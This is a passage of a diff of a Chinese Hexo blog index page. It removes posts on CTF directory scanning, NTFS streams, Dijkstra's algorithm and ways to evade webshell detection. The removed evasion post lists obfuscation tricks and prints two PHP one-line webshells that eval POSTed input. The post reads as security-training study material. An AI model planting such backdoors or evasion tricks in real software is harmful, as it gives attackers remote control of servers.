 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u http:&#x2F;&#x2F;challenge-91f1f5e6a791ab02.sandbox.ctfhub.com:10080&#x2F; -e *</span><br></pre></td></tr></table></figure>
 
 <p>就可以扫描这个网站了</p>
@@ -4511,111 +4927,6 @@ qVlRFz1v/9k=
 
 <p>即可跑出</p>
 </div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/05/21/NTFS%E6%96%87%E4%BB%B6%E6%B5%81/">NTFS文件流</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-05-21</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E7%B1%B3%E6%96%AF%E7%89%B9%E5%AE%89%E5%85%A8%E5%9F%B9%E8%AE%AD/">米斯特安全培训</a></span><div class="content"><p><a href="https://zhuanlan.zhihu.com/p/26108362" target="_blank" rel="noopener">知乎专栏</a></p>
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/05/18/%E7%BB%95%E8%BF%87%E5%AF%B9php%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80%E7%9A%84%E6%96%B9%E6%B3%95/">绕过对php一句话木马查杀的方法</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-05-18</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E7%B1%B3%E6%96%AF%E7%89%B9%E5%AE%89%E5%85%A8%E5%9F%B9%E8%AE%AD/">米斯特安全培训</a></span><div class="content"><ol>
-<li><p>改变大小写，然后strlower()</p>
-</li>
-<li><p>文本反转：strrev()</p>
-</li>
-<li><p>点号分割字符串：”a”.”b”</p>
-</li>
-<li><p>数组：array(“a”,”b”);   $a[0].$a[1]</p>
-</li>
-<li><p>干扰函数：var_dump()、print_r()</p>
-</li>
-<li><p>函数</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ag</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>($a);</span><br><span class="line">&#125;</span><br><span class="line">ag($_POST[<span class="string">'key'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>使用类</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">rg</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ag</span><span class="params">($a)</span></span>&#123;</span><br><span class="line">		@<span class="keyword">eval</span>($a);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$key = <span class="keyword">new</span> rg;</span><br><span class="line">$key -&gt; ag($_POST[<span class="string">'key'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>改cknife里的配置【base_64一下】</p>
-</li>
-</ol>
-</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/05/17/Dijkstra%E7%AE%97%E6%B3%95/">Dijkstra算法</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-05-17</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E4%B9%8B%E7%BE%8E/">数据结构与算法之美</a></span><div class="content"><p>当我们要寻找无权重边的最短路径时，我们常用广度优先搜索，即第一次遇到结点x就是x的最短路径【如社交媒体上的好友推荐】。但对于那些有权重边的最优解，我们就不能再用广度优先搜索了，因为最先到达x并不能代表这条路径就是最优解，因为每条路径的权重不同。如下图所示：</p>
-<p>如果用广度优先搜索会先到达地点B，但地点B并不是最优解</p>
-<p><img src="/2020/05/17/Dijkstra%E7%AE%97%E6%B3%95/2.jpg" alt="2"></p>
-<p>这时我们就需要用到<strong>Dijkstra</strong>算法了：</p>
-<h2 id="基本符号定义"><a href="#基本符号定义" class="headerlink" title="基本符号定义"></a>基本符号定义</h2><ol>
-<li>source：表示图中的起始点，缩写是s。</li>
-<li>weight[m，n]：表示从结点m到结点n的有向边之权重，如果m到n有多条边【一次到】则取权重最小的那条，缩写为w[m,n]。</li>
-<li>min_weight[m]：保存了从s到任意结点的最小权重，缩写为mw[m]。其中mw[s]=0。</li>
-<li>Finish：表示已经找到最小权重的结点之集合，一旦放入F，这个结点就不参与将来的计算，缩写为F。</li>
-</ol>
-<h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><ol>
-<li>设置mw[s]=0。</li>
-<li>往集合F里添加结点s，F包含且仅包含结点s。</li>
-<li>假设结点s能直接到达的集合为M，对于其中的每一条边m，则把mw[m]设为w[s,m]，同时对其他s不能直接到的结点，将通路设为∞。</li>
-</ol>
-<h2 id="算法步骤"><a href="#算法步骤" class="headerlink" title="算法步骤"></a>算法步骤</h2><h3 id="1-查找最小mv"><a href="#1-查找最小mv" class="headerlink" title="1.查找最小mv"></a>1.查找最小mv</h3><p>当由一个点发散出去多个mw时，从mw数组中选择出其中的最小值【如mw[x]】，此最小值就是s到x</p>
-<p>的最小权重，将其放入F数组中。此后x结点就不必被考虑了。</p>
-<h3 id="2-更新权重"><a href="#2-更新权重" class="headerlink" title="2.更新权重"></a>2.更新权重</h3><p>然后看看新加入F的结点x，是不是可以直接到达其他结点。如果是，看看这些x到达其他通路的长度，是否比这些点之前的mw更小【mw[x]+w[x,y]&lt;mw[y]】，如果是，就替换这些点mw的值。</p>
-<p>重复以上两步，知道集合F包含途中所有结点。</p>
-<h2 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h2><p><img src="/2020/05/17/Dijkstra%E7%AE%97%E6%B3%95/1.jpg" alt="1"></p>
-<table>
-<thead>
-<tr>
-<th>步骤</th>
-<th>F</th>
-<th>mw</th>
-<th>已确定的mw</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>1</td>
-<td>s</td>
-<td>mw[a]=0.5;mw[b]=0.3;mw[c]=0.2;mw[d]=0.4;其他mw=∞</td>
-<td>空集</td>
-</tr>
-<tr>
-<td>2</td>
-<td>s,c</td>
-<td>mw[a]=0.5;mw[b]=0.3;mw[d]=0.4;mw[f]=0.6;mw[h]=1.0;其他mw=∞</td>
-<td>mw[c]=0.2</td>
-</tr>
-<tr>
-<td>3</td>
-<td>s,c,b</td>
-<td>mw[a]=0.5;mw[d]=0.4;mw[f]=0.4;mw[h]=1.0;其他mw=∞</td>
-<td>mw[c]=0.2;mw[b]=0.3</td>
-</tr>
-<tr>
-<td>4</td>
-<td>s,c,b,d</td>
-<td>mw[a]=0.5;mw[f]=0.4;mw[h]=1.0;其他mw=∞</td>
-<td>mw[c]=0.2;mw[b]=0.3;mv[d]=0.4</td>
-</tr>
-<tr>
-<td>5</td>
-<td>s,c,b,d,f</td>
-<td>mw[a]=0.5;mw[h]=0.6;mw[e]=0.5;其他mw=∞</td>
-<td>mw[c]=0.2;mw[b]=0.3;mv[d]=0.4;mw[f]=0.4</td>
-</tr>
-<tr>
-<td>6</td>
-<td>s,c,b,d,f,a</td>
-<td>mw[h]=0.6;mw[e]=0.5;其他mw=∞</td>
-<td>mw[c]=0.2;mw[b]=0.3;mv[d]=0.4;mw[f]=0.4;mw[a]=0.5;</td>
-</tr>
-<tr>
-<td>7</td>
-<td>s,c,b,d,f,a,e</td>
-<td>mw[h]=0.6;mv[g]=0.6</td>
-<td>mw[c]=0.2;mw[b]=0.3;mv[d]=0.4;mw[f]=0.4;mw[a]=0.5;mw[e]=0.5</td>
-</tr>
-<tr>
-<td>8</td>
-<td>s,c,b,d,f,a,e,h</td>
-<td>mv[g]=0.6</td>
-<td>mw[c]=0.2;mw[b]=0.3;mv[d]=0.4;mw[f]=0.4;mw[a]=0.5;mw[e]=0.5:mw[h]=0.6;</td>
-</tr>
-<tr>
-<td>9</td>
-<td>s,c,b,d,f,a,e,h,g</td>
-<td>空集</td>
-<td>mw[c]=0.2;mw[b]=0.3;mv[d]=0.4;mw[f]=0.4;mw[a]=0.5;mw[e]=0.5:mw[h]=0.6;mv[g]=0.6</td>
-</tr>
-</tbody></table>
-<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>正在现学JAVA，之后补上。</p>
 </div><hr></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/2/">&lt;i class&#x3D;&quot;fa fa-chevron-right&quot;&gt;&lt;&#x2F;i&gt;</a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2020 By George</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
   $('#nav').addClass('is-mobile')
   $('footer').addClass('is-mobile')
